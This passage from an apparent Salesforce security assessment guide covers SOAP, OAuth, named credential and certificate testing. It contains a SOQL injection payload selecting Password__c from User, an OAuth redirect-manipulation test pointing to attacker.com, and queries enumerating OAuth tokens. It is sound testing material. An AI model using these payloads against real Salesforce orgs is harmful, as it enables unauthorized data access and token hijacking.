</span><span id="__span-57-10"><a id="__codelineno-57-10" name="__codelineno-57-10" href="#__codelineno-57-10"></a><span class="w">        </span><span class="nt">&lt;urn:query&gt;</span>
</span><span id="__span-57-11"><a id="__codelineno-57-11" name="__codelineno-57-11" href="#__codelineno-57-11"></a><span class="w">            </span><span class="nt">&lt;urn:queryString&gt;</span>SELECT<span class="w"> </span>Id,<span class="w"> </span>Name<span class="w"> </span>FROM<span class="w"> </span>Account<span class="w"> </span>LIMIT<span class="w"> </span>5<span class="nt">&lt;/urn:queryString&gt;</span>
</span><span id="__span-57-12"><a id="__codelineno-57-12" name="__codelineno-57-12" href="#__codelineno-57-12"></a><span class="w">        </span><span class="nt">&lt;/urn:query&gt;</span>
</span><span id="__span-57-13"><a id="__codelineno-57-13" name="__codelineno-57-13" href="#__codelineno-57-13"></a><span class="w">    </span><span class="nt">&lt;/soapenv:Body&gt;</span>
</span><span id="__span-57-14"><a id="__codelineno-57-14" name="__codelineno-57-14" href="#__codelineno-57-14"></a><span class="nt">&lt;/soapenv:Envelope&gt;</span>
</span></code></pre></div></p>
<p><strong>XML Injection Testing</strong>:
<div class="language-xml highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="cm">&lt;!-- SOAP SOQL injection test --&gt;</span>
</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="nt">&lt;soapenv:Envelope</span><span class="w"> </span><span class="na">xmlns:soapenv=</span><span class="s">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><span class="w"> </span>
</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a><span class="w">                  </span><span class="na">xmlns:urn=</span><span class="s">&quot;urn:enterprise.soap.sforce.com&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="w">    </span><span class="nt">&lt;soapenv:Header&gt;</span>
</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a><span class="w">        </span><span class="nt">&lt;urn:SessionHeader&gt;</span>
</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a><span class="w">            </span><span class="nt">&lt;urn:sessionId&gt;</span>SESSION_ID<span class="nt">&lt;/urn:sessionId&gt;</span>
</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a><span class="w">        </span><span class="nt">&lt;/urn:SessionHeader&gt;</span>
</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a><span class="w">    </span><span class="nt">&lt;/soapenv:Header&gt;</span>
</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a><span class="w">    </span><span class="nt">&lt;soapenv:Body&gt;</span>
</span><span id="__span-58-10"><a id="__codelineno-58-10" name="__codelineno-58-10" href="#__codelineno-58-10"></a><span class="w">        </span><span class="nt">&lt;urn:query&gt;</span>
</span><span id="__span-58-11"><a id="__codelineno-58-11" name="__codelineno-58-11" href="#__codelineno-58-11"></a><span class="w">            </span><span class="nt">&lt;urn:queryString&gt;</span>SELECT<span class="w"> </span>Id<span class="w"> </span>FROM<span class="w"> </span>Account<span class="w"> </span>WHERE<span class="w"> </span>Name<span class="w"> </span>=<span class="w"> </span>&#39;test&#39;<span class="w"> </span>UNION<span class="w"> </span>SELECT<span class="w"> </span>Password__c<span class="w"> </span>FROM<span class="w"> </span>User--<span class="nt">&lt;/urn:queryString&gt;</span>
</span><span id="__span-58-12"><a id="__codelineno-58-12" name="__codelineno-58-12" href="#__codelineno-58-12"></a><span class="w">        </span><span class="nt">&lt;/urn:query&gt;</span>
</span><span id="__span-58-13"><a id="__codelineno-58-13" name="__codelineno-58-13" href="#__codelineno-58-13"></a><span class="w">    </span><span class="nt">&lt;/soapenv:Body&gt;</span>
</span><span id="__span-58-14"><a id="__codelineno-58-14" name="__codelineno-58-14" href="#__codelineno-58-14"></a><span class="nt">&lt;/soapenv:Envelope&gt;</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Session hijacking, injection attacks, unauthorized data access.</p>
<hr />
<h2 id="integration-security-assessment">Integration Security Assessment</h2>
<h3 id="1-connected-apps-security-review">1. Connected Apps Security Review</h3>
<p><strong>Objective</strong>: Assess OAuth implementations and connected application security.</p>
<p><strong>Connected Apps Analysis</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="c1">-- Comprehensive connected apps analysis</span>
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">ContactEmail</span><span class="p">,</span><span class="w"> </span><span class="n">CallbackUrl</span><span class="p">,</span><span class="w"> </span><span class="n">ConsumerKey</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a><span class="w">       </span><span class="n">CreatedDate</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedBy</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span><span class="n">MobileSessionTimeout</span><span class="p">,</span>
</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="w">       </span><span class="n">RefreshTokenValidityPeriod</span><span class="p">,</span><span class="w"> </span><span class="n">UsersCanSelfAuthorize</span><span class="p">,</span>
</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a><span class="w">       </span><span class="n">OptionsFullScopeApprovals</span>
</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ConnectedApplication</span><span class="w"> </span>
</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">CreatedDate</span><span class="w"> </span><span class="k">DESC</span>
</span><span id="__span-59-8"><a id="__codelineno-59-8" name="__codelineno-59-8" href="#__codelineno-59-8"></a>
</span><span id="__span-59-9"><a id="__codelineno-59-9" name="__codelineno-59-9" href="#__codelineno-59-9"></a><span class="c1">-- OAuth flow analysis</span>
</span><span id="__span-59-10"><a id="__codelineno-59-10" name="__codelineno-59-10" href="#__codelineno-59-10"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">App</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">UserId</span><span class="p">,</span><span class="w"> </span><span class="k">User</span><span class="p">.</span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="k">User</span><span class="p">.</span><span class="n">Email</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-59-11"><a id="__codelineno-59-11" name="__codelineno-59-11" href="#__codelineno-59-11"></a><span class="w">       </span><span class="n">IssuedDate</span><span class="p">,</span><span class="w"> </span><span class="n">ExpirationDate</span><span class="p">,</span><span class="w"> </span><span class="n">UseCount</span><span class="p">,</span><span class="w"> </span><span class="n">LastUsedDate</span><span class="p">,</span>
</span><span id="__span-59-12"><a id="__codelineno-59-12" name="__codelineno-59-12" href="#__codelineno-59-12"></a><span class="w">       </span><span class="n">Scopes</span><span class="p">,</span><span class="w"> </span><span class="n">RedirectUri</span>
</span><span id="__span-59-13"><a id="__codelineno-59-13" name="__codelineno-59-13" href="#__codelineno-59-13"></a><span class="k">FROM</span><span class="w"> </span><span class="n">OAuth2Authorization</span><span class="w"> </span>
</span><span id="__span-59-14"><a id="__codelineno-59-14" name="__codelineno-59-14" href="#__codelineno-59-14"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">LastUsedDate</span><span class="w"> </span><span class="k">DESC</span><span class="w"> </span><span class="n">NULLS</span><span class="w"> </span><span class="k">LAST</span>
</span><span id="__span-59-15"><a id="__codelineno-59-15" name="__codelineno-59-15" href="#__codelineno-59-15"></a>
</span><span id="__span-59-16"><a id="__codelineno-59-16" name="__codelineno-59-16" href="#__codelineno-59-16"></a><span class="c1">-- Refresh token analysis</span>
</span><span id="__span-59-17"><a id="__codelineno-59-17" name="__codelineno-59-17" href="#__codelineno-59-17"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">AppName</span><span class="p">,</span><span class="w"> </span><span class="k">User</span><span class="p">.</span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="k">User</span><span class="p">.</span><span class="n">Email</span><span class="p">,</span><span class="w"> </span><span class="n">UseCount</span><span class="p">,</span>
</span><span id="__span-59-18"><a id="__codelineno-59-18" name="__codelineno-59-18" href="#__codelineno-59-18"></a><span class="w">       </span><span class="n">LastUsedDate</span><span class="p">,</span><span class="w"> </span><span class="n">IssuedDate</span><span class="p">,</span><span class="w"> </span><span class="n">ExpirationDate</span>
</span><span id="__span-59-19"><a id="__codelineno-59-19" name="__codelineno-59-19" href="#__codelineno-59-19"></a><span class="k">FROM</span><span class="w"> </span><span class="n">OAuth2PeriodicRefreshToken</span><span class="w"> </span>
</span><span id="__span-59-20"><a id="__codelineno-59-20" name="__codelineno-59-20" href="#__codelineno-59-20"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">LastUsedDate</span><span class="w"> </span><span class="k">DESC</span>
</span></code></pre></div></p>
<p><strong>OAuth Security Testing</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">test_oauth_flow</span><span class="p">(</span><span class="n">client_id</span><span class="p">,</span> <span class="n">redirect_uri</span><span class="p">,</span> <span class="n">authorization_endpoint</span><span class="p">):</span>
</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Test OAuth authorization code flow security&quot;&quot;&quot;</span>
</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>    <span class="c1"># Standard authorization request</span>
</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>    <span class="n">auth_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">authorization_endpoint</span><span class="si">}</span><span class="s2">?&quot;</span> \
</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>               <span class="sa">f</span><span class="s2">&quot;client_id=</span><span class="si">{</span><span class="n">client_id</span><span class="si">}</span><span class="s2">&amp;&quot;</span> \
</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6" href="#__codelineno-60-6"></a>               <span class="sa">f</span><span class="s2">&quot;redirect_uri=</span><span class="si">{</span><span class="n">redirect_uri</span><span class="si">}</span><span class="s2">&amp;&quot;</span> \
</span><span id="__span-60-7"><a id="__codelineno-60-7" name="__codelineno-60-7" href="#__codelineno-60-7"></a>               <span class="sa">f</span><span class="s2">&quot;response_type=code&amp;&quot;</span> \
</span><span id="__span-60-8"><a id="__codelineno-60-8" name="__codelineno-60-8" href="#__codelineno-60-8"></a>               <span class="sa">f</span><span class="s2">&quot;scope=full&quot;</span>
</span><span id="__span-60-9"><a id="__codelineno-60-9" name="__codelineno-60-9" href="#__codelineno-60-9"></a>
</span><span id="__span-60-10"><a id="__codelineno-60-10" name="__codelineno-60-10" href="#__codelineno-60-10"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Authorization URL: </span><span class="si">{</span><span class="n">auth_url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-60-11"><a id="__codelineno-60-11" name="__codelineno-60-11" href="#__codelineno-60-11"></a>
</span><span id="__span-60-12"><a id="__codelineno-60-12" name="__codelineno-60-12" href="#__codelineno-60-12"></a>    <span class="c1"># Test redirect URI manipulation</span>
</span><span id="__span-60-13"><a id="__codelineno-60-13" name="__codelineno-60-13" href="#__codelineno-60-13"></a>    <span class="n">malicious_redirect</span> <span class="o">=</span> <span class="s2">&quot;https://attacker.com/callback&quot;</span>
</span><span id="__span-60-14"><a id="__codelineno-60-14" name="__codelineno-60-14" href="#__codelineno-60-14"></a>    <span class="n">malicious_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">authorization_endpoint</span><span class="si">}</span><span class="s2">?&quot;</span> \
</span><span id="__span-60-15"><a id="__codelineno-60-15" name="__codelineno-60-15" href="#__codelineno-60-15"></a>                   <span class="sa">f</span><span class="s2">&quot;client_id=</span><span class="si">{</span><span class="n">client_id</span><span class="si">}</span><span class="s2">&amp;&quot;</span> \
</span><span id="__span-60-16"><a id="__codelineno-60-16" name="__codelineno-60-16" href="#__codelineno-60-16"></a>                   <span class="sa">f</span><span class="s2">&quot;redirect_uri=</span><span class="si">{</span><span class="n">malicious_redirect</span><span class="si">}</span><span class="s2">&amp;&quot;</span> \
</span><span id="__span-60-17"><a id="__codelineno-60-17" name="__codelineno-60-17" href="#__codelineno-60-17"></a>                   <span class="sa">f</span><span class="s2">&quot;response_type=code&amp;&quot;</span> \
</span><span id="__span-60-18"><a id="__codelineno-60-18" name="__codelineno-60-18" href="#__codelineno-60-18"></a>                   <span class="sa">f</span><span class="s2">&quot;scope=full&quot;</span>
</span><span id="__span-60-19"><a id="__codelineno-60-19" name="__codelineno-60-19" href="#__codelineno-60-19"></a>
</span><span id="__span-60-20"><a id="__codelineno-60-20" name="__codelineno-60-20" href="#__codelineno-60-20"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Malicious redirect test: </span><span class="si">{</span><span class="n">malicious_url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-60-21"><a id="__codelineno-60-21" name="__codelineno-60-21" href="#__codelineno-60-21"></a>
</span><span id="__span-60-22"><a id="__codelineno-60-22" name="__codelineno-60-22" href="#__codelineno-60-22"></a>    <span class="c1"># Test state parameter absence (CSRF protection)</span>
</span><span id="__span-60-23"><a id="__codelineno-60-23" name="__codelineno-60-23" href="#__codelineno-60-23"></a>    <span class="n">no_state_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">authorization_endpoint</span><span class="si">}</span><span class="s2">?&quot;</span> \
</span><span id="__span-60-24"><a id="__codelineno-60-24" name="__codelineno-60-24" href="#__codelineno-60-24"></a>                  <span class="sa">f</span><span class="s2">&quot;client_id=</span><span class="si">{</span><span class="n">client_id</span><span class="si">}</span><span class="s2">&amp;&quot;</span> \
</span><span id="__span-60-25"><a id="__codelineno-60-25" name="__codelineno-60-25" href="#__codelineno-60-25"></a>                  <span class="sa">f</span><span class="s2">&quot;redirect_uri=</span><span class="si">{</span><span class="n">redirect_uri</span><span class="si">}</span><span class="s2">&amp;&quot;</span> \
</span><span id="__span-60-26"><a id="__codelineno-60-26" name="__codelineno-60-26" href="#__codelineno-60-26"></a>                  <span class="sa">f</span><span class="s2">&quot;response_type=code&amp;&quot;</span> \
</span><span id="__span-60-27"><a id="__codelineno-60-27" name="__codelineno-60-27" href="#__codelineno-60-27"></a>                  <span class="sa">f</span><span class="s2">&quot;scope=full&quot;</span>
</span><span id="__span-60-28"><a id="__codelineno-60-28" name="__codelineno-60-28" href="#__codelineno-60-28"></a>
</span><span id="__span-60-29"><a id="__codelineno-60-29" name="__codelineno-60-29" href="#__codelineno-60-29"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;No state parameter: </span><span class="si">{</span><span class="n">no_state_url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-60-30"><a id="__codelineno-60-30" name="__codelineno-60-30" href="#__codelineno-60-30"></a>
</span><span id="__span-60-31"><a id="__codelineno-60-31" name="__codelineno-60-31" href="#__codelineno-60-31"></a><span class="c1"># Token validation testing</span>
</span><span id="__span-60-32"><a id="__codelineno-60-32" name="__codelineno-60-32" href="#__codelineno-60-32"></a><span class="k">def</span><span class="w"> </span><span class="nf">test_token_security</span><span class="p">(</span><span class="n">access_token</span><span class="p">,</span> <span class="n">refresh_token</span><span class="p">,</span> <span class="n">client_id</span><span class="p">):</span>
</span><span id="__span-60-33"><a id="__codelineno-60-33" name="__codelineno-60-33" href="#__codelineno-60-33"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Test OAuth token security&quot;&quot;&quot;</span>
</span><span id="__span-60-34"><a id="__codelineno-60-34" name="__codelineno-60-34" href="#__codelineno-60-34"></a>    <span class="c1"># Test token with different scopes</span>
</span><span id="__span-60-35"><a id="__codelineno-60-35" name="__codelineno-60-35" href="#__codelineno-60-35"></a>    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
</span><span id="__span-60-36"><a id="__codelineno-60-36" name="__codelineno-60-36" href="#__codelineno-60-36"></a>        <span class="s2">&quot;https://instance.salesforce.com/services/data/v52.0/sobjects/User/&quot;</span><span class="p">,</span>
</span><span id="__span-60-37"><a id="__codelineno-60-37" name="__codelineno-60-37" href="#__codelineno-60-37"></a>        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Authorization&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="n">access_token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">}</span>
</span><span id="__span-60-38"><a id="__codelineno-60-38" name="__codelineno-60-38" href="#__codelineno-60-38"></a>    <span class="p">)</span>
</span><span id="__span-60-39"><a id="__codelineno-60-39" name="__codelineno-60-39" href="#__codelineno-60-39"></a>
</span><span id="__span-60-40"><a id="__codelineno-60-40" name="__codelineno-60-40" href="#__codelineno-60-40"></a>    <span class="c1"># Test refresh token reuse</span>
</span><span id="__span-60-41"><a id="__codelineno-60-41" name="__codelineno-60-41" href="#__codelineno-60-41"></a>    <span class="n">refresh_response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span><span id="__span-60-42"><a id="__codelineno-60-42" name="__codelineno-60-42" href="#__codelineno-60-42"></a>        <span class="s2">&quot;https://instance.salesforce.com/services/oauth2/token&quot;</span><span class="p">,</span>
</span><span id="__span-60-43"><a id="__codelineno-60-43" name="__codelineno-60-43" href="#__codelineno-60-43"></a>        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span><span id="__span-60-44"><a id="__codelineno-60-44" name="__codelineno-60-44" href="#__codelineno-60-44"></a>            <span class="s2">&quot;grant_type&quot;</span><span class="p">:</span> <span class="s2">&quot;refresh_token&quot;</span><span class="p">,</span>
</span><span id="__span-60-45"><a id="__codelineno-60-45" name="__codelineno-60-45" href="#__codelineno-60-45"></a>            <span class="s2">&quot;refresh_token&quot;</span><span class="p">:</span> <span class="n">refresh_token</span><span class="p">,</span>
</span><span id="__span-60-46"><a id="__codelineno-60-46" name="__codelineno-60-46" href="#__codelineno-60-46"></a>            <span class="s2">&quot;client_id&quot;</span><span class="p">:</span> <span class="n">client_id</span>
</span><span id="__span-60-47"><a id="__codelineno-60-47" name="__codelineno-60-47" href="#__codelineno-60-47"></a>        <span class="p">}</span>
</span><span id="__span-60-48"><a id="__codelineno-60-48" name="__codelineno-60-48" href="#__codelineno-60-48"></a>    <span class="p">)</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: OAuth hijacking, unauthorized app access, token abuse.</p>
<h3 id="2-named-credentials-security-assessment">2. Named Credentials Security Assessment</h3>
<p><strong>Objective</strong>: Evaluate external service integration security and credential management.</p>
<p><strong>Named Credentials Analysis</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="c1">-- Named credentials configuration</span>
</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">DeveloperName</span><span class="p">,</span><span class="w"> </span><span class="n">Endpoint</span><span class="p">,</span><span class="w"> </span><span class="n">PrincipalType</span><span class="p">,</span><span class="w"> </span><span class="n">Protocol</span><span class="p">,</span>
</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a><span class="w">       </span><span class="n">AuthTokenEndpointUrl</span><span class="p">,</span><span class="w"> </span><span class="n">JwtAudience</span><span class="p">,</span><span class="w"> </span><span class="n">JwtIssuer</span><span class="p">,</span>
</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a><span class="w">       </span><span class="n">Username</span>
</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a><span class="k">FROM</span><span class="w"> </span><span class="n">NamedCredential</span>
</span><span id="__span-61-6"><a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a>
</span><span id="__span-61-7"><a id="__codelineno-61-7" name="__codelineno-61-7" href="#__codelineno-61-7"></a><span class="c1">-- External services using named credentials</span>
</span><span id="__span-61-8"><a id="__codelineno-61-8" name="__codelineno-61-8" href="#__codelineno-61-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">DeveloperName</span><span class="p">,</span><span class="w"> </span><span class="n">ExternalServiceProviderId</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-61-9"><a id="__codelineno-61-9" name="__codelineno-61-9" href="#__codelineno-61-9"></a><span class="w">       </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span><span class="n">Status</span>
</span><span id="__span-61-10"><a id="__codelineno-61-10" name="__codelineno-61-10" href="#__codelineno-61-10"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ExternalServiceRegistration</span>
</span></code></pre></div></p>
<p><strong>External Service Security Testing</strong>:
<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>// Test named credential security
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>public class NamedCredentialTester {
</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>    public static void testExternalCall(String namedCredential) {
</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>        HttpRequest req = new HttpRequest();
</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a>        req.setEndpoint(&#39;callout:&#39; + namedCredential + &#39;/api/sensitive-data&#39;);
</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a>        req.setMethod(&#39;GET&#39;);
</span><span id="__span-62-7"><a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a>
</span><span id="__span-62-8"><a id="__codelineno-62-8" name="__codelineno-62-8" href="#__codelineno-62-8"></a>        Http http = new Http();
</span><span id="__span-62-9"><a id="__codelineno-62-9" name="__codelineno-62-9" href="#__codelineno-62-9"></a>        try {
</span><span id="__span-62-10"><a id="__codelineno-62-10" name="__codelineno-62-10" href="#__codelineno-62-10"></a>            HttpResponse res = http.send(req);
</span><span id="__span-62-11"><a id="__codelineno-62-11" name="__codelineno-62-11" href="#__codelineno-62-11"></a>            System.debug(&#39;Response: &#39; + res.getStatusCode());
</span><span id="__span-62-12"><a id="__codelineno-62-12" name="__codelineno-62-12" href="#__codelineno-62-12"></a>            System.debug(&#39;Body: &#39; + res.getBody());
</span><span id="__span-62-13"><a id="__codelineno-62-13" name="__codelineno-62-13" href="#__codelineno-62-13"></a>        } catch (Exception e) {
</span><span id="__span-62-14"><a id="__codelineno-62-14" name="__codelineno-62-14" href="#__codelineno-62-14"></a>            System.debug(&#39;Error: &#39; + e.getMessage());
</span><span id="__span-62-15"><a id="__codelineno-62-15" name="__codelineno-62-15" href="#__codelineno-62-15"></a>        }
</span><span id="__span-62-16"><a id="__codelineno-62-16" name="__codelineno-62-16" href="#__codelineno-62-16"></a>    }
</span><span id="__span-62-17"><a id="__codelineno-62-17" name="__codelineno-62-17" href="#__codelineno-62-17"></a>}
</span></code></pre></div></p>
<p><strong>Certificate Validation Testing</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">test_certificate_validation</span><span class="p">(</span><span class="n">endpoint</span><span class="p">):</span>
</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Test SSL certificate validation&quot;&quot;&quot;</span>
</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a>    <span class="kn">import</span><span class="w"> </span><span class="nn">urllib3</span>
</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a>    <span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#__codelineno-63-5"></a>
</span><span id="__span-63-6"><a id="__codelineno-63-6" name="__codelineno-63-6" href="#__codelineno-63-6"></a>    <span class="k">try</span><span class="p">:</span>
</span><span id="__span-63-7"><a id="__codelineno-63-7" name="__codelineno-63-7" href="#__codelineno-63-7"></a>        <span class="c1"># Test with invalid certificate</span>
</span><span id="__span-63-8"><a id="__codelineno-63-8" name="__codelineno-63-8" href="#__codelineno-63-8"></a>        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
</span><span id="__span-63-9"><a id="__codelineno-63-9" name="__codelineno-63-9" href="#__codelineno-63-9"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Insecure connection accepted: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-63-10"><a id="__codelineno-63-10" name="__codelineno-63-10" href="#__codelineno-63-10"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span><span id="__span-63-11"><a id="__codelineno-63-11" name="__codelineno-63-11" href="#__codelineno-63-11"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Insecure connection rejected: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-63-12"><a id="__codelineno-63-12" name="__codelineno-63-12" href="#__codelineno-63-12"></a>
</span><span id="__span-63-13"><a id="__codelineno-63-13" name="__codelineno-63-13" href="#__codelineno-63-13"></a>    <span class="k">try</span><span class="p">:</span>
</span><span id="__span-63-14"><a id="__codelineno-63-14" name="__codelineno-63-14" href="#__codelineno-63-14"></a>        <span class="c1"># Test with proper certificate validation</span>
</span><span id="__span-63-15"><a id="__codelineno-63-15" name="__codelineno-63-15" href="#__codelineno-63-15"></a>        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
</span><span id="__span-63-16"><a id="__codelineno-63-16" name="__codelineno-63-16" href="#__codelineno-63-16"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Secure connection successful: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span id="__span-63-17"><a id="__codelineno-63-17" name="__codelineno-63-17" href="#__codelineno-63-17"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
